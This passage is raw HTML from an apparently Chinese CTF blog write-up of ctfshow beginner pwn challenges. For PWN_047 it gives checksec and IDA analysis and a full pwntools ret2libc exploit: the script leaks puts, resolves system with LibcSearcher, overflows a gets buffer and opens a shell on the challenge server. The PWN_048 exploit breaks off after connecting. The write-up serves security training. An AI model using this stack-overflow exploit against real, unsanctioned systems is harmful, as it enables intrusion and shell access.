	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/144_hu_cf5ef8ac764a5ada.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/144_hu_c486a541b03ac4d3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;428&#34;
		data-flex-basis=&#34;1028px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/145.png&#34;
	width=&#34;838&#34;
	height=&#34;145&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/145_hu_745994514c60a089.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/145_hu_de6931636b3f1092.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;è·Ÿè¿›ctfshowå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;577&#34;
		data-flex-basis=&#34;1387px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å’Œä¸Šé¢˜æ€è·¯å·®ä¸å¤šï¼Œæ”¹ä¸‹å‚æ•°å°±å¥½ï¼Œè¿˜æœ‰è¿™ä¸ªO.o?å¹²æ‰°ä½ &amp;hellip;&amp;hellip;&lt;/p&gt;
&lt;p&gt;é¢˜ç›®æœ‰ç‚¹æ€ªæˆ‘å…ˆè·³ä¸€è·³ï¼Œ&lt;/p&gt;
&lt;p&gt;å¾…å®š&lt;/p&gt;
&lt;h3 id=&#34;pwn_047&#34;&gt;PWN_047
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šez ret2libc     &lt;a class=&#34;link&#34; href=&#34;PWN_047&#34; &gt;PWN_047&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å°±æç¤ºç”¨ret2libc&lt;/p&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/146.png&#34;
	width=&#34;770&#34;
	height=&#34;234&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/146_hu_fc06a635d328f011.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/146_hu_919669922d8ebe2f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;329&#34;
		data-flex-basis=&#34;789px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDA32ä½åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/147.png&#34;
	width=&#34;864&#34;
	height=&#34;290&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/147_hu_ecb2389afc78956f.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/147_hu_c87d29f473550c93.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;297&#34;
		data-flex-basis=&#34;715px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿è¡Œç¨‹åºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/148.png&#34;
	width=&#34;1075&#34;
	height=&#34;585&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/148_hu_68a9c42744f4d3b5.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/148_hu_2f76dbfda3e7bb57.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;183&#34;
		data-flex-basis=&#34;441px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä¸€ä¸Šæ¥å°±ç»™äº†å‡ ä¸ªå‡½æ•°çš„åœ°å€ï¼Œç›®å‰æ¥çœ‹è¿˜æ²¡ç»™å‡ºsystemçš„åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°è¿˜å‘ç°äº†&lt;code&gt;gets&lt;/code&gt;å‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/149.png&#34;
	width=&#34;720&#34;
	height=&#34;200&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/149_hu_f03cd6d93e5d9470.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/149_hu_dce5425d9dfb9004.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;360&#34;
		data-flex-basis=&#34;864px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é‚£å°±æ˜¯é€šè¿‡æ ˆæº¢å‡ºret2libcæ¥æflagå’¯ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨dataå­—æ®µè¿˜æ‰¾åˆ°äº†/bin/shï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/150.png&#34;
	width=&#34;870&#34;
	height=&#34;288&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/150_hu_80b41588e2888370.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/150_hu_14f781a1e68c7689.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;302&#34;
		data-flex-basis=&#34;725px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ä½ æœ‰æ— å‘ç°ï¼šè¿™ä¸ª/bin/shçš„åœ°å€å°±æ˜¯gift&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/151.png&#34;
	width=&#34;1204&#34;
	height=&#34;570&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/151_hu_fc6f5087e790c1de.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/151_hu_f0d75ad6073237cd.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;211&#34;
		data-flex-basis=&#34;506px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;é‚£æ€è·¯å°±æ˜¯ç”¨putsè¿›è¡Œæ³„éœ²åœ°å€ï¼Œå¾—å‡ºåç§»é‡å†åæ¨å‡ºsystemå‡½æ•°çš„çœŸå®åœ°å€&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;LibcSearcher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28146&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./pwn&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts_got&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;got&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts_plt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;elf&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;plt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;puts:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;gift:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;drop&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#åªè¯»å–åœ°å€ï¼Œä¸¢å¼ƒæ¢è¡Œ\nçš„16è¿›åˆ¶å­—ç¬¦ä¸²&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LibcSearcher&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;puts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x9c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bin_sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_048&#34;&gt;PWN_048
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæ²¡æœ‰writeäº†ï¼Œè¯•è¯•ç”¨putså§ï¼Œæ›´ç®€å•äº†å‘¢ã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_048&#34; &gt;PWN_048&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/152.png&#34;
	width=&#34;795&#34;
	height=&#34;234&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/152_hu_82ddc294ee9dbdfb.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/152_hu_da96e2278b37543.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;checksec&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;339&#34;
		data-flex-basis=&#34;815px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;IDA32åˆ†æï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/153.png&#34;
	width=&#34;936&#34;
	height=&#34;199&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/153_hu_db48b024a3718cbf.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/153_hu_7601ca075a457054.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;mainå‡½æ•°&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;470&#34;
		data-flex-basis=&#34;1128px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/154.png&#34;
	width=&#34;746&#34;
	height=&#34;140&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/154_hu_6bb66ac2c50192d8.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/154_hu_277011d3545cec3e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;æœ‰æ ˆæº¢å‡º&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;532&#34;
		data-flex-basis=&#34;1278px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ç¼–å†™expæ³„éœ²putsçš„åœ°å€ï¼Œå¾—å‡ºåç§»é‡åŒºåæ¨å‡ºsystemå‡½æ•°ã€/bin/shçš„åœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;LibcSearcher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28189&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
